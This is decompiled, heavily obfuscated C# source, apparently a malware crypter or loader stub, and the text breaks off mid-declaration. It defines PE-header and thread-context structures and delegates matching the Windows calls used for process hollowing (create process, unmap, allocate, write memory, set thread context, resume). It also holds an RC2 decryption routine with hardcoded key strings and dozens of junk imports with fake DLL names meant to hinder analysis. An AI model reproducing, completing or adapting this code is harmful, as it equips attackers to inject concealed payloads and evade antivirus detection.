using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace God;

public class Sena
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct rzSn
	{
		public int tIl;

		public string tT2;

		public string KB1;

		public string B7y;

		public int DkV;

		public int C;

		public int AEDS;

		public int wMfr;

		public int XASE4;

		public int wgZ4l;

		public int A9n;

		public int R2sd;

		public short Yfu;

		public short Y1x;

		public int bwNs;

		public int RrSn;

		public int RVus;

		public int IxOo;
	}

	public struct PP0
	{
		public int qJgGG;

		public IntPtr W5trvj;

		public int vqZNy;
	}

	public struct jsdhfs8A
	{
		public ushort mr4;

		public ushort JroBs;

		public ushort ToHc;

		public ushort nAZd;

		public ushort FIsR;

		public ushort XaBy;

		public ushort hSuAV;

		public ushort wvt82;

		public ushort w8u;

		public ushort hRp;

		public ushort n28;

		public ushort kpl9;

		public ushort a9qo0;

		public ushort AIu;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] yiZi;

		public ushort o3g5;

		public ushort UJJ;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] DDDDDDDDD;

		public int Da;
	}

	public struct j9o
	{
		public uint LLy;

		public Kn3r usY;

		public W32h Oo;
	}

	public struct Kn3r
	{
		public ushort sHzXO;

		public ushort o8y;

		public uint q6KV;

		public uint Xx2;

		public uint ccm;

		public ushort Ol7;

		public ushort a4vT;
	}

	public struct W32h
	{
		public ushort NH4u6p;

		public byte XRS;

		public byte ecRv5R;

		public uint ULeu;

		public uint qLbx;

		public uint czfx;

		public uint szwmiy;

		public uint I0dXe;

		public uint C5yw;

		public uint Yo;

		public uint SectionA;

		public uint FileA;

		public ushort VvlADO;

		public ushort QZVoR;

		public ushort Rlg;

		public ushort Hlw3;

		public ushort BYoJ2k;

		public ushort atQHf;

		public uint pWsY;

		public uint O6;

		public uint Wu;

		public uint MGlWmk;

		public ushort fsd4s;

		public ushort fjio;

		public uint ph9dp;

		public uint VHRCj;

		public uint RRwV;

		public uint EODD;

		public uint ELRn;

		public uint jsKFX;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Mms[] taqSc;
	}

	public struct Mms
	{
		public uint ewq34q234;

		public uint das34aw33;
	}

	public struct POINTAPI11
	{
		public int x;

		public int B7;
	}

	public struct ACL21
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct POINTAPI61
	{
		public int x;

		public int B7;
	}

	public struct ACL31
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct ACL51
	{
		public short AclRevision;

		public short Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct LARGE_INTEGER1
	{
		public int lowpart;

		public int highpart;
	}

	public struct PALETTEENTRY1
	{
		public byte peRed;

		public byte peGreen;

		public byte peBlue;

		public byte peFlags;
	}

	public struct COORD11
	{
		public short x;

		public short B7;
	}

	public struct EVENTLOGRECORD1
	{
		public int Length;

		public int Reserved;

		public int RecordNumber;

		public int TimeGenerated;

		public int TimeWritten;

		public int EventID;

		public int ClosingRecordNumber;

		public int StringOffset;

		public int UserSidLength;

		public int UserSidOffset;

		public int DataLength;

		public int DataOffset;

		public short EventStructure;

		public short NumStrings;

		public short EventCategory;

		public short ReservedFlags;
	}

	public struct RECT1
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct WAVEHDR11
	{
		public int lpData;

		public int dwBufferLength;

		public int dwBytesRecorded;

		public int dwUser;

		public int dwFlags;

		public int dwLoops;

		public int lpNext;

		public int Reserved;
	}

	public struct POINTAPI71
	{
		public int x;

		public int B7;
	}

	public struct CANDIDATEFORM1
	{
		public int dwIndex;

		public int dwStyle;

		public POINTAPI11 ptCurrentPos;

		public RECT1 rcArea;
	}

	public struct RECT31
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct POINTAPI111
	{
		public int x;

		public int B7;
	}

	public struct COMPOSITIONFORM1
	{
		public int dwStyle;

		public POINTAPI11 ptCurrentPos;

		public RECT1 rcArea;
	}

	public struct POINTAPI21
	{
		public int x;

		public int B7;
	}

	public struct MIDIHDR11
	{
		public string lpData;

		public int dwBufferLength;

		public int dwBytesRecorded;

		public int dwUser;

		public int dwFlags;

		public int lpNext;

		public int Reserved;
	}

	public struct PMwgc4CkRLWr
	{
		public short jiDn3;

		public short LJwZ;

		public string a2gxj;

		public string aLQHqO;
	}

	public struct fknsakogfb
	{
		public int cbStruct;

		public int dwControlID;

		public int cChannels;

		public int item;

		public int cbDetails;

		public int paDetails;
	}

	public struct Mijiohuih
	{
		public int jiDn3;

		public int LJwZ;

		public int a2gxj;

		public int fdwSupport;

		public int cDestinations;

		public string aLQHqO;
	}

	public struct hjyiu67f
	{
		public int gfghrf;

		public int rgrghrf;

		public int ulkulk;

		public int lui6g;

		public int vnvcb45;

		public int[] nygjt43;

		public int[] fh5uguj;

		public string fhfdhdf4;

		public string jhtriu54;
	}

	public struct MIXERLINECONTROLS111
	{
		public int cbStruct;

		public int dwLineID;

		public int dwControl;

		public int cControls;

		public int cbmxctrl;

		public hjyiu67f pamxctrl;
	}

	public struct fdf2
	{
		public byte qJJ5Q;

		public byte Otnq;

		public short FMGZ;

		public short gK26;

		public short wbI4U;
	}

	public struct jWlh
	{
		public int jWlhB;

		public int UC2u;

		public int JTW;

		public int iMa;
	}

	public struct uyl0
	{
		public int q3Q4;

		public int uyl0W;

		public int a1prT;

		public int S15vt;

		public int IdGlN;

		public fdf2 PdIg;
	}

	public struct DbZ
	{
		public int PdIgx;

		public int HOyO;
	}

	public struct KERNINGPAIR
	{
		public int wFirst;

		public int wSecond;

		public int iKernAmount;
	}

	public struct LARGE_INTEGER
	{
		public int lowpart;

		public int highpart;
	}

	public struct Hhk
	{
		public uint Ii;

		public uint d2;

		public uint mr4;

		public uint d9;

		public uint ad;

		public uint dsa;

		public uint ds;

		public mt mt;

		public uint dh;

		public uint sad;

		public uint da;

		public uint MD;

		public uint RD;

		public uint mSI;

		public uint WDA;

		public uint AD3;

		public uint D21;

		public uint AS4;

		public uint K32;

		public uint F2W;

		public uint HHJ;

		public uint ADF5;

		public uint GSSA;

		public uint Dsa3;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] Er;
	}

	public struct mt
	{
		public uint Kd;

		public uint Jc;

		public uint Ck9;

		public uint Yw;

		public uint Ad;

		public uint Daf;

		public uint Fa3;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] FSDRF43;

		public uint FA32QA;
	}

	public struct ETXs
	{
		public uint Qm;

		public uint Gs;
	}

	public struct WAVEOUTCAPS
	{
		public short jiDn3;

		public short LJwZ;

		public short wChannels;

		public int a2gxj;

		public string aLQHqO;

		public int dwFormats;

		public int dwSupport;
	}

	public struct PERF_COUNTER_DEFINITION
	{
		public int ByteLength;

		public int CounterNameTitleIndex;

		public string CounterNameTitle;

		public int CounterHelpTitleIndex;

		public string CounterHelpTitle;

		public int DefaultScale;

		public int DetailLevel;

		public int CounterStructure;

		public int CounterSize;

		public int CounterOffset;
	}

	public struct BjMWZ
	{
		public byte Xig;

		public ETXs Mi2sc;

		public uint Al;

		public uint Da2;

		public uint Po;

		public uint E2;

		public uint Fs5;

		public uint Fsb;

		public uint Qbf;

		public uint As3;
	}

	public struct PROCESS_INFORMATION
	{
		public int hProcess;

		public int hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	public struct FONTSIGNATURE
	{
		public int[] fsUsb;

		public int[] fsCsb;
	}

	public struct NEWTEXTMETRIC
	{
		public int tmHeight;

		public int tmAscent;

		public int tmDescent;

		public int tmInternalLeading;

		public int tmExternalLeading;

		public int tmAveCharWidth;

		public int tmMaxCharWidth;

		public int tmWeight;

		public int tmOverhang;

		public int tmDigitizedAspectX;

		public int tmDigitizedAspectY;

		public byte tmFirstChar;

		public byte tmLastChar;

		public byte tmDefaultChar;

		public byte tmBreakChar;

		public byte tmItalic;

		public byte tmUnderlined;

		public byte tmStruckOut;

		public byte tmPitchAndFamily;

		public byte tmCharSet;

		public int ntmFlags;

		public int ntmSizeEM;

		public int ntmCellHeight;

		public int ntmAveWidth;
	}

	public struct NEWTEXTMETRICEX
	{
		public NEWTEXTMETRIC ntmTm;

		public FONTSIGNATURE ntmFontSig;
	}

	public struct M9v
	{
		public IntPtr skYe;

		public IntPtr Rf;

		public int TGJWE;

		public int Sdf;
	}

	public struct MCI_WAVE_OPEN_PARMS
	{
		public int dwCallback;

		public int wDeviceID;

		public string lpstrDeviceStructure;

		public string lpstrElementName;

		public string lpstrAlias;

		public int dwBufferSeconds;
	}

	public delegate bool REw(string gFQ5, string HlH, ref PP0 PTm, ref PP0 jJM, bool rh0, uint DEi, IntPtr dU8, string ase32ew, [In] ref rzSn das43fsa, out M9v Ck9);

	public struct MENUITEMINFO
	{
		public int cbSize;

		public int fMask;

		public int fStructure;

		public int fState;

		public int wID;

		public int hSubMenu;

		public int hbmpChecked;

		public int hbmpUnchecked;

		public int dwItemData;

		public string dwStructureData;

		public int cch;
	}

	public delegate bool o0Pe(IntPtr vG2, int Al, byte[] z0k, int uNJ, out int nvk1);

	public struct WAVEINCAPS
	{
		public short jiDn3;

		public short LJwZ;

		public int a2gxj;

		public string aLQHqO;

		public int dwFormats;

		public short wChannels;
	}

	public struct dAFYz
	{
		public byte mAq9;

		public byte QzIiQ;

		public short DomG;

		public short V0oC;

		public short DhGnL;
	}

	public struct St3G
	{
		public int yDQ5;

		public int B1GP;

		public int T12W6;

		public int C5smNZ;
	}

	public struct dAFY
	{
		public int YwZA;

		public int MHj7M;

		public int W6Evr;

		public int YIWe;

		public int pi2cg;

		public dAFYz mCL8;
	}

	public struct uIV1q
	{
		public int Ue1qJ;

		public int LrQz;
	}

	public struct MIDIINCAPS11
	{
		public short wMid;

		public short wPid;

		public string vDriverVersion;

		public string szPname;
	}

	public struct MIXERCONTROLDETAILS11
	{
		public int cbStruct;

		public int dwControlID;

		public int cChannels;

		public int item;

		public int cbDetails;

		public int paDetails;
	}

	public struct MIXERCAPS11
	{
		public int wMid;

		public int wPid;

		public int vDriverVersion;

		public int fdwSupport;

		public int cDestinations;

		public string szPname;
	}

	public struct MIXERCONTROL11
	{
		public int cbStruct;

		public int dwControlID;

		public int dwControlStructure;

		public int fdwControl;

		public int cMultipleItems;

		public int[] Bounds;

		public int[] Metrics;

		public string szShortName;

		public string szName;
	}

	public struct MIXERLIaNECONTROLS111
	{
		public int cbStruct;

		public int dwLineID;

		public int dwControl;

		public int cControls;

		public int cbmxctrl;

		public MIXERCONTROL11 pamxctrl;
	}

	public delegate int PMN(IntPtr hFA, int Al, ref int dej, int dej, ref int uZf);

	public struct SECURITY_QUALITY_OF_SERVICE
	{
		public int Length;

		public short Impersonationlevel;

		public short ContextTrackingMode;

		public int EffectiveOnly;
	}

	public delegate IntPtr mjQ(IntPtr PP3, int Al, uint Iim, uint Ck9, uint DAS32);

	public struct SESSION_BUFFER
	{
		public short lsn;

		public short State;

		public string local_name;

		public string remote_name;

		public short rcvs_outstanding;

		public short sends_outstanding;
	}

	public delegate long grdf(IntPtr tJs, int Al);

	public struct SID_AND_ATTRIBUTES
	{
		public int Sid;

		public int Attributes;
	}

	public delegate uint eZ3r(IntPtr TWl);

	public struct SIDANDATTRIBUTES
	{
		public int Sid;

		public int Attributes;
	}

	public struct TOKEN_GROUPS
	{
		public int GroupCount;

		public SID_AND_ATTRIBUTES[] Groups;
	}

	public delegate bool sCaf(IntPtr C9Wi, ref Hhk FTxO);

	public struct WINDOWPOS
	{
		public int hwnd;

		public int hWndInsertAfter;

		public int x;

		public int B7;

		public int cx;

		public int cy;

		public int flags;
	}

	public delegate bool TuGxm(IntPtr U0O, ref Hhk T5S);

	public const int MAXPNAMELEN11 = 32;

	public const string ookdg = "\\dg426";

	public const string ery437y3 = "54654688nut856435328";

	public const string e7y647 = "345t346hdfhdfh4";

	public const int BACKGROUND_GREEN = 32;

	public const int MAXPNAMELEN = 32;

	public const int MAXPNAMELELN = 32;

	public const int MAXPNAMELEN211 = 32;

	public const int MIXER_SHORT_NAME_CHARS11 = 16;

	public const int MIXER_LONG_NAME_CHARS11 = 64;

	public const int NCBNAMSZ = 16;

	public const int ANYSIZE_ARRAY = 1;

	public static string NH4u6p(string Blxej, string kmW5C)
	{
		RC2CryptoServiceProvider rC2CryptoServiceProvider = new RC2CryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		try
		{
			byte[] array2 = (rC2CryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(kmW5C)));
			rC2CryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rC2CryptoServiceProvider.CreateDecryptor();
			byte[] array3 = Convert.FromBase64String(Blxej);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array3, 0, array3.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	[DllImport("hJE", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void OleUninitializeq();

	[DllImport("Sjz", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int HbOK(int hdc, int nX, int nY, POINTAPI11 lpPoint);

	[DllImport("HU4c/X9.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int LPO([MarshalAs(UnmanagedType.VBByRefStr)] ref string SubsystemName, byte[] HandleId, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectStructureName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectName, int SecurityDescriptor, int DesiredAccess, int ByValGenericMapping, int ObjectCreation, int GrantedAccess, int AccessStatus, int pfGenerateOnClose);

	[DllImport("SiiX.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _7PQJ5I(int QueryHandle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string CounterPath, ref int CounterHandle);

	[DllImport("SWW.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int t0wn(int hPrinter);

	[DllImport("xfQg", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _2kRjH(int HKL, int flags);

	[DllImport("cxgA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int JkRi(int ByValhService, int ByValdwSecurityInformation, byte[] ByVallpSecurityDescriptor, int ByValcbBufSize, int ByValpcbBytesNeeded);

	[DllImport("nlt", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int Jp1E(int hdc, POINTAPI111 lpPoint, int nCount);

	[DllImport("haM+.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int eTskR(ACL21 pAcl, int dwAceRevision, int AccessMask, byte[] pSid);

	[DllImport("Sjz", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int Tv1(int hdc);

	[DllImport("ISYT", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void VFsv0G(int dwExceptionCode, int dwExceptionFlags, int nNumberOfArguments, int lpArguments);

	[DllImport("HkI.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int gkdrE_002B(ACL31 pAcl, int dwAceRevision, int AccessMask, byte[] pSid);

	[DllImport("im", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _52Sq(int hConsoleInput, byte[] lpBuffer, int nNumberOfCharsToRead, int lpNumberOfCharsRead, byte[] lpReserved);

	[DllImport("pZ1.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int qxzH(fdf2 pAcl, int dwAceRevision, int dwAccessMask, byte[] pSid, int bAuditSuccess, int bAuditFailure);

	[DllImport("Sjz", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AngleArc(int hdc, int x, int B7, int dwRadius, double eStartAngle, double eSweepAngle);

	[DllImport("iW2Qp.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImM(LARGE_INTEGER1 Luid);

	[DllImport("hEk7o.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _8wpl(int hPrinter, int Level, byte pData, int cdBuf, int pcbNeeded);

	[DllImport("d0b.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int xyB(int hPrinter, byte[] pBuf, int cdBuf, int pNoBytesRead);

	[DllImport("qF+.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int HOnv(int hEventLog, int dwReadFlags, int dwRecordOffset, EVENTLOGRECORD1 lpBuffer, int nNumberOfBytesToRead, int pnBytesRead, int pnMinNumberOfBytesNeeded);

	[DllImport("Pig", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int HOnvq8b(int ByValhConsoleOutput, int lpAttribute, int nLength, COORD11 dwReadCoord, int lpNumberOfAttrsRead);

	[DllImport("FMz", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int QncZ(int hPalette, int wStartIndex, int wNumEntries, PALETTEENTRY1 lpPaletteColors);

	[DllImport("BoM", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _5xp([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);

	[DllImport("SHxo.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int z30s(int hService, int ByValdwServiceStructure, int dwStartStructure, int dwErrorControl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBinaryPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLoadOrderGroup, int lpdwTagId, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDependencies, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ByVallpServiceStartName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpPassword, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDisplayName);

	[DllImport("Dj5s", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int DPG(int Locale, int dwCmpFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString1, int cchCount1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString2, int cchCount2);

	[DllImport("fIR0.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _7SAJ(int hkl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpStr, int uBufLen);

	[DllImport("meHO.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int kf9q(int hWaveOut);

	[DllImport("8rcY.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int WYn(int hWaveOut, WAVEHDR11 lpWaveOutHdr, int uSize);

	[DllImport("uQv.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int cw07Kl(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValue, int lpcbValue);

	[DllImport("xfQg", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, byte[] lParam);

	[DllImport("fIR0.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmSetCandidateWindow(int himc, CANDIDATEFORM1 lpCandidateForm);

	[DllImport("Sjz", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int HAll(int hdc, int ArcDirection);

	[DllImport("xfQg", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int G9p(int wFormat, int hMem);

	public static object Lu8()
	{
		return Environment.OSVersion.Version.Major == 6;
	}

	[DllImport("ays5.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int DVEKWR(int hInternetSession, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sServerName, short nServerPort, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sUsername, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sPassword, int lService, int lFlags, int lContext);

	[DllImport("m8l1.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int sv2e(int himc, POINTAPI11 lpPoint);

	[DllImport("ogX.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int rJ_002Fu(int himc, COMPOSITIONFORM1 ByVallpCompositionForm);

	[DllImport("xfQg", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int UqA(byte Char2);

	[DllImport("W3lM", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int i0gr(int hMem, int wBytes, int wFlags);

	[DllImport("mQNbQ", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int NTmcm(int hResData);

	[DllImport("+d+k0U.dll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int YqL9(int ByValdwElementID, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ByVallpstrStructure);

	[DllImport("CQA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("Vpzee.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] pyXgy(IntPtr JErmDqOMS, int HhrqXda);

	[DllImport("HLuRT.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] IeWIR(IntPtr FBLcSrbKS, int Wuhjgzt);

	[DllImport("sgkpP.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] BtPVC(IntPtr BJWoaYidm, int AyluLzJ);

	[DllImport("yUuks.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] HjNhw(IntPtr TWBlLAUKo, int bZIJfoD);

	[DllImport("KvUIY.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] GxGXe(IntPtr AifxMdsEU, int OmMguKn);

	[DllImport("FcPoo.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] WCbRJ(IntPtr AZyIwUtvV, int vOEXRqA);

	[DllImport("GCBuT.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] XqVon(IntPtr netSKaliF, int PPOFbTD);

	[DllImport("SRwYp.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] eRELO(IntPtr iHTNHYZrD, int DnmqpcN);

	[DllImport("FATVZ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] kVxFM(IntPtr jqajdnHJs, int fvXEyxw);

	[DllImport("MMNrG.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] iWPnt(IntPtr IGlZYCNwZ, int kCmpyXg);

	[DllImport("dqFfA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] huxYf(IntPtr VsLpVqmfs, int ybxKfDL);

	[DllImport("GNieU.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] GMekF(IntPtr CgPwVSkmW, int nTgohZu);

	[DllImport("ZowSl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ycmRz(IntPtr xJlvSChTj, int rTqMEoW);

	[DllImport("cGSiT.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] djJjE(IntPtr eXJelOrKq, int blVNYMt);

	[DllImport("HXknU.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] deOJK(IntPtr avvDJZSpn, int kwPDuPF);

	[DllImport("zCrhL.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] wBIXz(IntPtr sKgIuILDt, int GaXyaul);

	[DllImport("HPdgC.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ANuij(IntPtr wxRlNZXLB, int OHVdFFe);

	[DllImport("zkMGo.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ZCFdH(IntPtr MJrgBVAAs, int zUoEiYB);

	[DllImport("tWacW.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] pBCHi(IntPtr bPqwvbIyD, int hYskSZP);

	[DllImport("NKMRt.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] gpaof(IntPtr HypsrRyAx, int jtnhuxY);

	[DllImport("AVsLp.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] fdqFf(IntPtr VqmfsybxK, int fDLGMek);

	[DllImport("UCgPw.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] FGNie(IntPtr VSkmWnTgo, int hZuycmR);

	[DllImport("lxJlv.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] zZowS(IntPtr SChTjrTqM, int EoWdjJj);

	[DllImport("TeXJe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] EcGSi(IntPtr lOrKqblVN, int YMtdeOJ);

	[DllImport("UavvD.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] KHXkn(IntPtr JZSpnkwPD, int uPFwBIX);

	[DllImport("LsKgI.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] zzCrh(IntPtr uILDtGaXy, int aulANui);

	[DllImport("CwxRl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] jHPdg(IntPtr NZXLBOHVd, int FFeZCFd);

	[DllImport("oMJrg.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] HzkMG(IntPtr BVAAszUoE, int iYBpBCH);

	[DllImport("WbPqw.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] itWac(IntPtr vbIyDhYsk, int SZPgpao);

	[DllImport("tHyps.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] fNKMR(IntPtr rRyAxjtnh, int uxYfdqF);

	[DllImport("pVqmf.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] fAVsL(IntPtr sybxKfDLG, int MekFGNi);

	[DllImport("wVSkm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] eUCgP(IntPtr WnTgohZuy, int cmRzZow);

	[DllImport("vSChT.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] SlxJl(IntPtr jrTqMEoWd, int jJjEcGS);

	[DllImport("elOrK.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] iTeXJ(IntPtr qblVNYMtd, int eOJKHXk);

	[DllImport("DJZSp.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] nUavv(IntPtr nkwPDuPFw, int BIXzzCr);

	[DllImport("IuILD.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] hLsKg(IntPtr tGaXyaulA, int NuijHPd);

	[DllImport("lNZXL.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] gCwxR(IntPtr BOHVdFFeZ, int CFdHzkM);

	[DllImport("gBVAA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] GoMJr(IntPtr szUoEiYBp, int BCHitWa);

	[DllImport("wvbIy.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] cWbPq(IntPtr DhYskSZPg, int paofNKM);

	[DllImport("srRyA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] RtHyp(IntPtr xjtnhuxYf, int dqFfAVs);

	[DllImport("fsybx.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] LpVqm(IntPtr KfDLGMekF, int GNieUCg);

	[DllImport("mWnTg.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] PwVSk(IntPtr ohZuycmRz, int ZowSlxJ);

	[DllImport("TjrTq.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
